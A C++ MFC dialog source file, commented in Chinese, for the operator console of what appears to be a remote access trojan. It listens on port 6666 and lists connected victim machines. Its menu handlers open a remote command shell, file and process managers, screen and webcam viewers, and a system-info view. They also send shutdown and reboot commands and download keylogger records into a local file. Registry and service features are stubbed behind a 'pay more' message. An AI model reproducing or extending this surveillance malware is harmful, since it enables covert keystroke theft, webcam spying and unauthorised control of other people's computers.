
// socket apcetDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "socket apcet.h"
#include "socket apcetDlg.h"
#include "afxdialogex.h"
#include "Clistensocket.h"
#include "Cmd.h"
#include"CServer.h"
#include "SCREEN.h"
#include "Process.h"
#include "Filemange.h"
#include"Creg.h"
#include"Ifo.h"
#include"Vdio.h"
#include <stdio.h>
#include <iostream>
#include <cstring>
#include <fstream>
using namespace std;
#ifdef _DEBUG
#define new DEBUG_NEW
#endif
CTreeCtrl *ptree;
HTREEITEM htree=NULL;
CString ConstCharToCStringIp(const char* ch)
{
	char* buf = new char[strlen(ch) + 1];
	memset(buf, 0, sizeof(ch));
	strcpy(buf, ch);
	CString  strName;
	strName = buf;
	delete[]buf;
	return strName;
}
// CsocketapcetDlg 对话框



CsocketapcetDlg::CsocketapcetDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CsocketapcetDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_pListensocket = NULL;
}

void CsocketapcetDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TREE1, m_tree);
}

BEGIN_MESSAGE_MAP(CsocketapcetDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_NOTIFY(NM_DBLCLK, IDC_TREE1, &CsocketapcetDlg::OnDblclkTree1)
	ON_COMMAND(ID_32771, &CsocketapcetDlg::File)
	ON_COMMAND(ID_32772, &CsocketapcetDlg::screnn)
	ON_COMMAND(ID_32773, &CsocketapcetDlg::cmd)
	ON_COMMAND(ID_32774, &CsocketapcetDlg::keyboard)
	ON_COMMAND(ID_32775, &CsocketapcetDlg::shutdown)
	ON_COMMAND(ID_32776, &CsocketapcetDlg::reboot)
	ON_COMMAND(ID_32777, &CsocketapcetDlg::exit)
	ON_COMMAND(ID_32778, &CsocketapcetDlg::mess)
	ON_COMMAND(ID_32779, &CsocketapcetDlg::clean)
	ON_COMMAND(ID_32780, &CsocketapcetDlg::process)
	ON_COMMAND(ID_32782, &CsocketapcetDlg::reg)
	ON_COMMAND(ID_32783, &CsocketapcetDlg::server)
	ON_COMMAND(ID_32799, &CsocketapcetDlg::Getifo)
	ON_COMMAND(ID_32800, &CsocketapcetDlg::GetVdio)
END_MESSAGE_MAP()


// CsocketapcetDlg 消息处理程序

BOOL CsocketapcetDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO:  在此添加额外的初始化代码
	m_tree.InsertItem(_T("所有电脑"));
	m_pListensocket = new CListenSocket(this);
	
	//socket
	if (m_pListensocket->Create(6666, SOCK_STREAM)==FALSE)
	{
		MessageBoxA(0, "初始化失败", "tip", 0);
		delete m_pListensocket;
		m_pListensocket = NULL;
		EndDialog(IDOK);
	}

	if (FALSE == m_pListensocket->Listen())
	{
		MessageBoxA(0, "初始化失败", "tip", 0);
		delete m_pListensocket;
		m_pListensocket = NULL;
		EndDialog(IDOK);
	}
	
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CsocketapcetDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CsocketapcetDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CsocketapcetDlg::OnAccept()
{
	HTREEITEM hnewItem;
	CClistensocket *pSocket = new CClistensocket;
	m_pListensocket->Accept(*pSocket);
	//获取信息
	char ip[16] = "";
	pSocket->Receive(ip, 16);
	//反应 tree
	HTREEITEM hRootItem = m_tree.GetRootItem();
	hnewItem = m_tree.InsertItem(ConstCharToCStringIp(ip), hRootItem);
	
	m_tree.SetItemData(hnewItem, (DWORD)pSocket);
	
	//MessageBoxA(0, "有连接产生", "tip", 0);
}

void CsocketapcetDlg::OnDblclkTree1(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO:  在此添加控件通知处理程序代码
	ptree = (CTreeCtrl*)GetDlgItem(IDC_TREE1);
	htree= m_tree.GetSelectedItem();
	if (htree == m_tree.GetRootItem())
		return;
	POINT p;
	GetCursorPos(&p);
	CMenu menu;
	menu.LoadMenu(IDR_MENU1);
	CMenu * pMenu;
	pMenu = menu.GetSubMenu(0);
	pMenu->EnableMenuItem(ID_32771, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32772, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32773, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32774, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32775, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32776, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32777, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32778, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32779, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32780, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32783, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32782, MF_BYCOMMAND | MF_ENABLED);
	pMenu->TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON, p.x, p.y, this);
	pMenu->Detach();
	menu.DestroyMenu();
	//CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	*pResult = 0;
}

void CsocketapcetDlg::File()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname,_T("(正在工作中)"))!=NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	CFilemange *pDlg = new CFilemange(pSocket, htree, tname);
	pDlg->Create(IDD_FILE);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(正在工作中)");
	m_tree.SetItemText(htree, tname);
	return;
}
void CsocketapcetDlg::server()
{
	MessageBoxA(0, "加钱！！！", "tip", 0);
	return;
	if (htree == NULL)
	{
		return;
	}
	CClistensocket* pSocket = (CClistensocket*)m_tree.GetItemData(htree);
	CServer* pDlg = new CServer(pSocket);
	pDlg->Create(IDD_SERVER);
	pDlg->ShowWindow(SW_SHOW);
	return;
}
void CsocketapcetDlg::reg()
{
	MessageBoxA(0, "加钱！！！", "tip", 0);
	return;
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	Creg *pDlg = new Creg(pSocket);
	pDlg->Create(IDD_REG);
	pDlg->ShowWindow(SW_SHOW);
	return;
}
void CsocketapcetDlg::screnn()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(正在工作中)")) != NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	CSCREEN *pDlg = new CSCREEN(pSocket, htree, tname);
	pDlg->Create(IDD_SCREEN);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(正在工作中)");
	m_tree.SetItemText(htree, tname);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::cmd()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(正在工作中)")) != NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	CCmd *pDlg = new CCmd(pSocket, htree, tname);
	pDlg->Create(IDD_CMD);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(正在工作中)");
	m_tree.SetItemText(htree, tname);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::keyboard()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(正在工作中)")) != NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	pSocket->Send("keyboard", 10);
	char ckeck[10] = "";
	pSocket->Receive(ckeck, 10);
	if (strcmp(ckeck,"wrong")==0)
	{
		MessageBoxA(0, "获取失败", "tip", 0);
		return;
	}
	pSocket->Send("keyboard", 10);
	//////////////////recv/////////////////////////
	const int bufferSize = 1024;
	char buffer[bufferSize] = { 0 };
	int readLen = 0;
	ofstream desFile;
	desFile.open("ketrecode.txt", ios::binary);
	do
	{
		readLen = pSocket->Receive(buffer, bufferSize);
		//MessageBoxA(0, buffer, "1", 0);
		if (strcmp("finish", buffer) == 0)
		{
			//m_pSocket->Send("imokeee", 10);
			break;
		}
		pSocket->Send("imokeee", 10);
		desFile.write(buffer, readLen);
	} while (true);
	desFile.close();
	MessageBoxA(0, "已放到当前目录下的key.txt", "tip", 0);
	return;
}
void CsocketapcetDlg::shutdown()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(正在工作中)")) != NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	pSocket->Send("shutdown", 9);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::reboot()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(正在工作中)")) != NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	pSocket->Send("reboot", 7);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::exit()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(正在工作中)")) != NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree==NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	pSocket->Send("exit", 5);
	m_tree.DeleteItem(htree);
	delete[] pSocket;
	return;
}
void CsocketapcetDlg::mess()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(正在工作中)")) != NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	Ctip *pDlg = new Ctip(pSocket, htree, tname);
	pDlg->Create(IDD_TIP);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(正在工作中)");
	m_tree.SetItemText(htree, tname);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::clean()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(正在工作中)")) != NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	pSocket->Send("clearkeyboard", 15);
	char recd[25] = "";
	pSocket->Receive(recd, 25);
	MessageBoxA(0, recd, "tip", 0);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::process()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(正在工作中)")) != NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	CProcess *pDlg = new CProcess(pSocket, htree, tname);
	pDlg->Create(IDD_PROCESS);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(正在工作中)");
	m_tree.SetItemText(htree, tname);
	return;
}
void CsocketapcetDlg::Getifo()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(正在工作中)")) != NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	CIfo *pDlg = new CIfo(pSocket, htree, tname);
	pDlg->Create(IDD_IFO);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(正在工作中)");
	m_tree.SetItemText(htree, tname);
	return;
}
void CsocketapcetDlg::GetVdio()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(正在工作中)")) != NULL)
	{
		MessageBoxA(0, "请先结束当前工作", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	pSocket->Send("checkvdio",12);
	char yesorno[5] = "";
	pSocket->Receive(yesorno, 5);
	if (strcmp(yesorno,"yes")==0)
	{
		CVdio *pDlg = new CVdio(pSocket, htree, tname);
		pDlg->Create(IDD_VIOD);
		pDlg->ShowWindow(SW_SHOW);
		tname = tname + _T("(正在工作中)");
		m_tree.SetItemText(htree, tname);
	}
	else
	{
		MessageBoxA(0, "对方没有摄像头", "Tip", 0);
	}
}